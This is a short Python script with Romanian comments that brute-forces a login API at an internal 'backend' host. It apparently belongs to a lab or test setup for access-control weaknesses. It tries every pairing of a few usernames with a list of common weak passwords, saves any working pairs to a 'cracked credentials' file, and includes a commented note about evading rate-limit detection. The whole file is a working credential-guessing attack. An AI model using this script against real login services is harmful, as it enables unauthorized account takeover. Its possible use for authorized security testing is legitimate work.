import requests
import time
from itertools import product

BASE_URL = "http://backend:8080/api/bac/login"
USERNAMES = ["user1", "user2", "admin1", "admin2"]
PASSWORDS = [
    "password", "password123", "qwerty", "123456", "adminpass", "root123",
    "letmein", "welcome", "123123", "passw0rd", "abc123", "monkey", "dragon",
    "sunshine", "football", "iloveyou", "admin", "superuser", "test1234"
]

def test_brute_force():
    found_credentials = []
    
    for username, password in product(USERNAMES, PASSWORDS):
        payload = {"username": username, "password": password}
        response = requests.post(BASE_URL, json=payload)

        if response.status_code == 200:
            try:
                data = response.json()
                if "username" in data:
                    print(f"[✔] Cracked: {username} / {password}")
                    found_credentials.append((username, password))
                    continue  # Dacă găsim parola, trecem la următorul user
            except ValueError:
                pass  # Răspuns invalid

        # time.sleep(0.5)  # Evită detectarea prin rate-limiting

    if found_credentials:
        with open("cracked_credentials.txt", "w") as f:
            for user, pwd in found_credentials:
                f.write(f"{user}:{pwd}\n")
        print("[🔥] Parolele sparte au fost salvate în cracked_credentials.txt!")
    else:
        print("[✖] Nu s-au spart conturi.")

if __name__ == "__main__":
    test_brute_force()
